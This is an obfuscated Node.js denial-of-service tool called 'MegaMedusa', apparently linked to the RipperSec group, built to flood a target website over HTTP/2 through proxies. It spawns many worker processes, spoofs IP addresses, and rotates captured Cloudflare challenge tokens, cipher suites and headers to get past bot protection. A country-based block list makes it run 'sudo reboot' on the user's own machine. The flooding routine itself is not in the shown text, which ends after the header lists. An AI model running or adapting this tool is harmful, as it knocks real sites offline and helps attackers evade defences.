
const net = require('net');
const http2 = require("http2");
const tls = require('tls');
const cluster = require('cluster');
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const axios = require('axios');
const https = require('https');
const childProcess = require('child_process');
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on('uncaughtException', function (_0x8932d0) {});
if (process.argv.length < 0x7) {
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ 　 █▀▀▄ █▀▀▄ █▀▀█ █▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ 　 █──█ █──█ █──█ ▀▀█   ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ 　 ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀       ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m     ╚═════╦════════════════════════════════════════════╦═════╝   ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║            [0mAuthor : [31mTrashDono              [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║   [0mGithub : [32mhttps://github.com/TrashDono    [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║     [0mTelegram : [32mhttps://t.me/RipperSec      [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ╚════════════════════════════════════════════╝");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m node[1m[33m Medusa [1m[32m<HOST> <TIME> <RPS> <THREADS> <PROXY>.");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Made by [1m[31mhttps://t.me/RipperSec");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Update your proxy every 1 week :[1m[33m node scraper.js[1m[0m");
  }
  process.exit();
}
const headers = {};
function readLines(_0x8d3d0e) {
  return fs.readFileSync(_0x8d3d0e, "utf-8").toString().split(/\r?\n/);
}
const targetURL = process.argv[0x2];
const agent = new https.Agent({
  'rejectUnauthorized': false
});
const domain = process.argv[0x2];
const parsedUrl = url.parse(domain);
const blockedDomain = ['.id', ".my", ".ps", "go.id", '.lb', '.ir', ".bd", '.ye', ".iq", '-ye', "malaysia", "palestine", 'indonesia', "bangladesh", "yemen", ".bn", '.tr'];
if (blockedDomain.some(_0x23c6ee => parsedUrl.hostname.toLowerCase().endsWith(_0x23c6ee))) {
  console.log("[0m[[31mWaring[0m] [33mThis Domain [31m" + parsedUrl.hostname + " [33mblocked, Are you dumb?[0m");
  childProcess.execSync("sudo reboot");
  childProcess.execSync("su -c 'reboot'");
  process.exit(0x1);
}
function getStatus() {
  const _0x27f6f7 = new Promise((_0x20a894, _0x293789) => {
    setTimeout(() => {
      _0x293789(new Error("[31mRequest timed out"));
    }, 0x1388);
  });
  const _0xd9abba = axios.get(targetURL, {
    'httpsAgent': agent
  });
  Promise.race([_0xd9abba, _0x27f6f7]).then(_0x5803a1 => {
    const {
      status: _0x4eb5cb,
      data: _0x565504
    } = _0x5803a1;
    console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m " + getTitleFromHTML(_0x565504) + " ([32m" + _0x4eb5cb + "[0m)");
  })['catch'](_0x49ef19 => {
    if (_0x49ef19.message === "[31mRequest timed out[0m") {
      console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m [33mRequest Timed Out[0m");
    } else {
      if (_0x49ef19.response) {
        const _0x36face = getTitleFromHTML(_0x49ef19.response.data);
        console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m " + _0x36face + " ([31m" + _0x49ef19.response.status + "[0m)");
      } else {
        console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m" + _0x49ef19.message + " [0m");
      }
    }
  });
}
function getTitleFromHTML(_0x330231) {
  const _0x55b3e2 = /<title>(.*?)<\/title>/i;
  const _0x36b6d0 = _0x330231.match(_0x55b3e2);
  if (_0x36b6d0 && _0x36b6d0[0x1]) {
    return _0x36b6d0[0x1];
  }
  return "Not Found";
}
function randomIntn(_0x37244a, _0x5e8397) {
  return Math.floor(Math.random() * (_0x5e8397 - _0x37244a) + _0x37244a);
}
function randstr(_0x6ba01d) {
  var _0x404460 = '';
  var _0x1b31e9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x3bc4bc = 0x0; _0x3bc4bc < _0x6ba01d; _0x3bc4bc++) {
    _0x404460 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x1b31e9));
  }
  ;
  return _0x404460;
}
function randayat(_0x19c864) {
  var _0x1175de = '';
  var _0x40e4e7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x1eada6 = 0x0; _0x1eada6 < _0x19c864; _0x1eada6++) {
    _0x1175de += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x40e4e7));
  }
  ;
  return _0x1175de;
}
function randnombor(_0x3af870) {
  var _0x5c028c = '';
  var _0x46ebb3 = '0123456789'.length;
  for (var _0x3e898c = 0x0; _0x3e898c < _0x3af870; _0x3e898c++) {
    _0x5c028c += '0123456789'.charAt(Math.floor(Math.random() * _0x46ebb3));
  }
  ;
  return _0x5c028c;
}
function randomElement(_0x21da9f) {
  return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100);
};
const spoofed = Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
const os = require('os');
function getRandomHeapSize() {
  return Math.floor(Math.random() * 1537) + 0x200;
}
if (cluster.isMaster) {
  console.clear();
  console.log('');
  console.log("[0m ░█▀▄▀█ █▀▀ █▀▀▀ █▀▀█ ░█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ ");
  console.log("[0m ░█░█░█ █▀▀ █─▀█ █▄▄█ ░█░█░█ █▀▀ █──█ █──█ ▀▀█ █▄▄█  ");
  console.log("[0m ░█──░█ ▀▀▀ ▀▀▀▀ ▀──▀ ░█──░█ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ V3.2 ");
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mTarget[33m ⚡️ : [32m" + process.argv[0x2]);
  console.log("[31m-> [0mTime[33m ⏳ : [32m" + process.argv[0x3]);
  console.log("[31m-> [0mRate[33m 💣 : [32m" + process.argv[0x4]);
  console.log("[31m-> [0mThread[33m ⚙️  : [32m" + process.argv[0x5]);
  console.log("[31m-> [0mProxyFile[33m 🗃 : [32m" + process.argv[0x6]);
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mGithub[33m 🗂 : [32mhttps://github.com/TrashDono");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log("[33m--------------------------------------------");
  const restartScript = () => {
    console.log("[>] Restarting the script", 0x3e8, "ms...");
    for (const _0x111521 in cluster.workers) {
      cluster.workers[_0x111521].kill();
    }
    setTimeout(() => {
      for (let _0x26b37f = 0x1; _0x26b37f <= process.argv[0x5]; _0x26b37f++) {
        const _0x5f5db8 = Math.floor(Math.random() * 1537) + 0x200;
        cluster.fork({
          'NODE_OPTIONS': "--max-old-space-size=" + _0x5f5db8
        });
      }
    }, 0x3e8);
  };
  const handleRAMUsage = () => {
    const _0x499ee8 = os.totalmem();
    const _0x2e6733 = _0x499ee8 - os.freemem();
    const _0xa737ae = _0x2e6733 / _0x499ee8 * 0x64;
    if (_0xa737ae >= 0x55) {
      console.log("[!] Maximum RAM usage:", _0xa737ae.toFixed(0x2), '%');
      restartScript();
    }
  };
  setInterval(handleRAMUsage, 0x1388);
  for (let i = 0x1; i <= process.argv[0x5]; i++) {
    const heapSize = Math.floor(Math.random() * 1537) + 0x200;
    cluster.fork({
      'NODE_OPTIONS': '--max-old-space-size=' + heapSize
    });
    console.log("[31m[[33mMegaMedusa[31m] [32m-> [0mEngine [31m" + i + " [0mStarted");
  }
  console.log("[31m[[33mMegaMedusa[31m] [32m-> [33mMegaMedusa Attacking...");
  setInterval(getStatus, 0x7d0);
  setTimeout(() => {
    console.log("[31m[[33mMegaMedusa[31m] [32m-> [33mAttack Successful ✅[0m");
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
} else {
  setInterval(runFlooder, 0x1);
}
const sig = ["ecdsa_secp256r1_sha256", 'ecdsa_secp384r1_sha384', "ecdsa_secp521r1_sha512", 'rsa_pss_rsae_sha256', "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
const pathts = ['?s=', '/?', '', "?q=", '?true=', '?', '/', "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", '?category=technology', "?category=entertainment", '?sort=newest', "?filter=popular", '?limit=10', "?start_date=1989-06-04", "?end_date=1989-06-04", "?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514", "?__cf_chl_tk=ZpDDzirt54EoyEeNjwwGO_FZktYyR0QxXRz9Vt_egvk-1711220025-0.0.1.1-1471", "?__cf_chl_tk=2QI_clISOivyUmvBJ4fkVroBhLME3TJv3_2coOv7BXc-1711307038-0.0.1.1-1471", '?__cf_chl_tk=z6L8htd0t62MvL0xSbWgI67gGERMr2u7zjFDIlkGWYQ-1711310297-0.0.1.1-1471', "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU", "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU", "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs", "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA", "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU", "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs", "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A", '?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA', "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs", '?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA', "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U", "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU", '?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs', "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA", "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A", "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs", "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA", "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU", '?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs', "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA", "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0", "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh", '?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0', "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0", '?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0', "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU", '?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU', "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA", "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU", '?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU', "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs", '?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA', '?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A', "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs", "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs"];
const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES', 'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK"];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2,application/x-lzma", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel', 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8'];
